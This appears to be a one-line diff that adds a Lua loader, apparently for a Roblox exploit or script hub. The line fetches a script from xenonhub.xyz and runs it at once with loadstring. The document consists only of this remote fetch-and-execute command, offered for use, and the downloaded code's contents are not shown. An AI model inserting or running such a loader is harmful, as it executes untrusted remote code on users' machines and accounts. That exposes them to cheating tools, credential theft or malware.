@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://www.xenonhub.xyz/loader.lua'))()
